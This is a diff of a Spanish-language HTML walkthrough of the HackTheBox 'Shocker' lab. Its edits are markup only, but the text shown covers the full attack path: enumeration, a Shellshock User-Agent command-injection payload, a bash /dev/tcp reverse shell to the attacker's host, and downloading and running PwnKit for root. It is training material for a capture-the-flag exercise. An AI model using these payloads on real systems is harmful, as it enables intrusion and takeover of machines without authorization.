@@ -1,14 +1,14 @@
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/shocker/02-tarjeta.png" />
 </p>
 
 <p>¡Hola!
-En esta ocasión vamos a resolver de la máquina <code class="highlighter-rouge">Shocker</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
+En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">Shocker</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
 La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
 
 <h2 id="preparación">PREPARACIÓN</h2>
 
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="highlighter-rouge">shocker</code> y los subdirectorios <code class="highlighter-rouge">recon</code> junto con <code class="highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">shocker</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mkhack shocker
 ❯ <span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
@@ -16,7 +16,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="reconocimiento">RECONOCIMIENTO</h2>
 
-<p>Accedemos al directorio <code class="highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ osping 10.10.10.56
   
@@ -38,7 +38,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   80/tcp   open  http
 </code></pre></div></div>
 
-<p>Luego de identificar los puertos abiertos <code class="highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ❯ nmap <span class="nt">-p80</span>,2222 <span class="nt">-sCV</span> 10.10.10.56 <span class="nt">-oN</span> versions                                                                                                                                                                              
   PORT     STATE SERVICE VERSION
@@ -53,15 +53,15 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </span></code></pre></div></div>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/shocker/03-page.png" />       
 </p>
 
 <h2 id="fuzzing">FUZZING</h2>
 
-<p>Iniciamos con el reconocimiento de potenciales rutas de acceso web por el puerto <code class="highlighter-rouge">80</code>, por medio de múltiples peticiones y evidenciando el codigo de respuesta, verificamos que rutas son accesibles.</p>
+<p>Iniciamos con el reconocimiento de potenciales rutas de acceso web por el puerto <code class="language-plaintext highlighter-rouge">80</code>, por medio de múltiples peticiones y evidenciando el codigo de respuesta, verificamos que rutas son accesibles.</p>
 
-<p>En esta ocasión usaremos la herramienta <code class="highlighter-rouge">dirsearch</code> con el parámetro <code class="highlighter-rouge">-f</code> para poder generar peticiones hacia directorios, es decir, en terminaciones <code class="highlighter-rouge">/</code>.</p>
+<p>En esta ocasión usaremos la herramienta <code class="language-plaintext highlighter-rouge">dirsearch</code> con el parámetro <code class="language-plaintext highlighter-rouge">-f</code> para poder generar peticiones hacia directorios, es decir, en terminaciones <code class="language-plaintext highlighter-rouge">/</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ❯ dirsearch <span class="nt">-t</span> 200 <span class="nt">-x</span> 404 <span class="nt">-f</span> <span class="nt">-u</span> http://10.10.10.56/
   
@@ -75,7 +75,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   <span class="o">[</span>20:17:21] 403 -  299B  - /server-status
 </code></pre></div></div>
 
-<p>Podemos ver en los resultados el directorio <code class="highlighter-rouge">/cgi-bin/</code>, este directorio tiene como función la ejecución de scripts del servidor, suelen ser de extensiones <code class="highlighter-rouge">sh</code>, <code class="highlighter-rouge">pl</code>, <code class="highlighter-rouge">cgi</code>, entre otros. Por lo que realizamos la creación de un diccionario de extensiones para más adelante ejecutar un fuzzing avanzado.</p>
+<p>Podemos ver en los resultados el directorio <code class="language-plaintext highlighter-rouge">/cgi-bin/</code>, este directorio tiene como función la ejecución de scripts del servidor, suelen ser de extensiones <code class="language-plaintext highlighter-rouge">sh</code>, <code class="language-plaintext highlighter-rouge">pl</code>, <code class="language-plaintext highlighter-rouge">cgi</code>, entre otros. Por lo que realizamos la creación de un diccionario de extensiones para más adelante ejecutar un fuzzing avanzado.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  vim extensiones.txt
   txt
@@ -85,7 +85,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   cgi
 </code></pre></div></div>
 
-<p>Ahora que creamos un diccionario con algunas extensiones potenciales, con la herramienta <code class="highlighter-rouge">wfuzz</code> agregamos dos diccionarios, esto es posibl por medio del parámetro <code class="highlighter-rouge">-w</code>, podemos agregar la cantidad de diccionarios que deseemos, en esta ocasión solo requerimos de dos, adicionalmente, el comodín para realizar el fuzzing con esta utilidad es <code class="highlighter-rouge">FUZZ</code>, sin embargo, para utilizar el otro diccionario, el siguiente comodín se denomina como <code class="highlighter-rouge">FUZ2Z</code>.</p>
+<p>Ahora que creamos un diccionario con algunas extensiones potenciales, con la herramienta <code class="language-plaintext highlighter-rouge">wfuzz</code> agregamos dos diccionarios, esto es posibl por medio del parámetro <code class="language-plaintext highlighter-rouge">-w</code>, podemos agregar la cantidad de diccionarios que deseemos, en esta ocasión solo requerimos de dos, adicionalmente, el comodín para realizar el fuzzing con esta utilidad es <code class="language-plaintext highlighter-rouge">FUZZ</code>, sin embargo, para utilizar el otro diccionario, el siguiente comodín se denomina como <code class="language-plaintext highlighter-rouge">FUZ2Z</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   ❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-w</span> extensiones.txt http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
   <span class="o">=====================================================================</span>
@@ -96,7 +96,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="shell-shock">SHELL SHOCK</h2>
 
-<p>¡Ya tenemos un script potencial!, ahora vamos a revisar cual es el contenido de <code class="highlighter-rouge">user.sh</code></p>
+<p>¡Ya tenemos un script potencial!, ahora vamos a revisar cual es el contenido de <code class="language-plaintext highlighter-rouge">user.sh</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://10.10.10.56/cgi-bin/user.sh"</span>
   Content-Type: text/plain
@@ -106,7 +106,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
    21:30:45 up 57 min,  0 <span class="nb">users</span>,  load average: 0.02, 0.03, 0.00
 </code></pre></div></div>
 
-<p>Efectivamente corresponde a un script que se está ejecutando en el servidor, por lo que ahora vamos con ayuda de <code class="highlighter-rouge">nmap</code> y su script <code class="highlighter-rouge">http-shellshock</code> detectar si es o no vulnerable a <em>shellshock</em>.</p>
+<p>Efectivamente corresponde a un script que se está ejecutando en el servidor, por lo que ahora vamos con ayuda de <code class="language-plaintext highlighter-rouge">nmap</code> y su script <code class="language-plaintext highlighter-rouge">http-shellshock</code> detectar si es o no vulnerable a <em>shellshock</em>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ nmap <span class="nt">-p80</span> 10.10.10.56 <span class="nt">--script</span> http-shellshock <span class="nt">--script-args</span> <span class="nv">uri</span><span class="o">=</span>/cgi-bin/user.sh
   PORT   STATE SERVICE
@@ -132,19 +132,19 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="explotación">EXPLOTACIÓN</h2>
 
-<p>Básicamente la explotación de <code class="highlighter-rouge">shell shock</code> se da en la modificación del <code class="highlighter-rouge">User-Agent</code> al momento de enviar una petición web, esta cabecera se envía de la siguiente manera <code class="highlighter-rouge">User-Agent: () { :; };echo;echo; &lt;COMMAND&gt;</code>, siendo <command /> el comando que deseamos ejecutar remotamente.</p>
+<p>Básicamente la explotación de <code class="language-plaintext highlighter-rouge">shell shock</code> se da en la modificación del <code class="language-plaintext highlighter-rouge">User-Agent</code> al momento de enviar una petición web, esta cabecera se envía de la siguiente manera <code class="language-plaintext highlighter-rouge">User-Agent: () { :; };echo;echo; &lt;COMMAND&gt;</code>, siendo <command /> el comando que deseamos ejecutar remotamente.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   ❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://10.10.10.56/cgi-bin/user.sh"</span> <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; };echo;echo; /usr/bin/whoami"</span>
   
   shelly
 </code></pre></div></div>
 
-<p>Una vez podemos evidenciar que tenemos ejecución remota de comandos, procedemos a entablar una reverse shell por medio de un oneliner de <code class="highlighter-rouge">bash</code>.</p>
+<p>Una vez podemos evidenciar que tenemos ejecución remota de comandos, procedemos a entablar una reverse shell por medio de un oneliner de <code class="language-plaintext highlighter-rouge">bash</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://10.10.10.56/cgi-bin/user.sh"</span> <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; };echo;echo; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.4/4564 0&gt;&amp;1"</span>
 </code></pre></div></div>
 
-<p>Nos ponemos en escucha por el puerto de la reverse shell y tenemos acceso con el usuario <code class="highlighter-rouge">shelly</code>.</p>
+<p>Nos ponemos en escucha por el puerto de la reverse shell y tenemos acceso con el usuario <code class="language-plaintext highlighter-rouge">shelly</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ nc <span class="nt">-lvnp</span> 4564
   listening on <span class="o">[</span>any] 4564 ...
@@ -155,7 +155,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   </span>shelly
 </code></pre></div></div>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/shocker/04-intrusion.png" />       
 </p>
 
@@ -201,12 +201,12 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   ❯ curl <span class="nt">-fsSL</span> https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit <span class="nt">-o</span> PwnKit
 </code></pre></div></div>
 
-<p>Luego de tener descargado el recurso, creamos un servidor <code class="highlighter-rouge">http</code> con ayuda de <code class="highlighter-rouge">python</code>.</p>
+<p>Luego de tener descargado el recurso, creamos un servidor <code class="language-plaintext highlighter-rouge">http</code> con ayuda de <code class="language-plaintext highlighter-rouge">python</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ <span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
 </code></pre></div></div>
 
-<p>En la máquina victima por medio de la utilidad <code class="highlighter-rouge">wget</code>, realizamos la descarga del contenido compartido anteriormente.</p>
+<p>En la máquina victima por medio de la utilidad <code class="language-plaintext highlighter-rouge">wget</code>, realizamos la descarga del contenido compartido anteriormente.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">cd</span> /tmp
   shelly@Shocker:/tmp<span class="nv">$ </span>wget http://10.10.14.4/PwnKit                             
@@ -229,7 +229,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   </span>root
 </code></pre></div></div>
 
-<p>Ya no queda más que leer la flag de <code class="highlighter-rouge">root</code>.</p>
+<p>Ya no queda más que leer la flag de <code class="language-plaintext highlighter-rouge">root</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c"># find / -name root.txt </span>
   /root/root.txt
@@ -237,9 +237,9 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   52c2715605
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la máquina <code class="highlighter-rouge">Shocker</code> de HackTheBox!</p>
+<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">Shocker</code> de HackTheBox!</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/shocker/05-finish.png" />
 </p>
 
